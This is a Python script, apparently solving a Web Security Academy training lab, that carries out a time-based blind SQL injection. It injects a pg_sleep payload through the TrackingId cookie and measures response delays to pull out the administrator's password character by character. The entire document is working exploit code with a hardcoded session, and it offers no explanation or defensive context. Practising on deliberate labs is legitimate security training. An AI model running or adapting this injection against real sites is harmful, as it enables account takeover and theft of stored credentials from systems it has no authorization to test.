import requests
import string
import time

# Target and session
url = "https://0a7800c3041616da80c6216900aa0033.web-security-academy.net/"
tracking_id = "UUHgnp4idxP5HXuZ"
session = "lxguDCkoOTdbg9IixxExVJvwgCUFEWhH"

# Extraction settings
delay, threshold, max_length = 10, 9.5, 50
chars = string.ascii_lowercase + string.digits

http = requests.Session()
http.headers["User-Agent"] = "Mozilla/5.0"

password = ""

print("[*] Time-Based Blind SQLi")
print("[*] Extracting administrator password...\n")

# Extract password character by character
for pos in range(1, max_length + 1):
    for char in chars:

        # Test password character using pg_sleep()
        cookies = {
            "TrackingId": (
                f"{tracking_id}'||(SELECT CASE WHEN "
                f"SUBSTRING(password,{pos},1)='{char}' "
                f"THEN pg_sleep({delay}) ELSE pg_sleep(0) END "
                "FROM users WHERE username='administrator')--"
            ),
            "session": session
        }

        try:
            start = time.perf_counter()
            http.get(url, cookies=cookies, timeout=delay + 10)
            elapsed = time.perf_counter() - start

            if elapsed >= threshold:
                password += char
                print(f"[+] {pos:02}: {char} | {elapsed * 1000:.2f} ms")
                break

        except requests.RequestException:
            continue
    else:
        print(f"\n[!] Extraction stopped at position {pos}.")
        break

print(f"\n[+] Password: {password}")
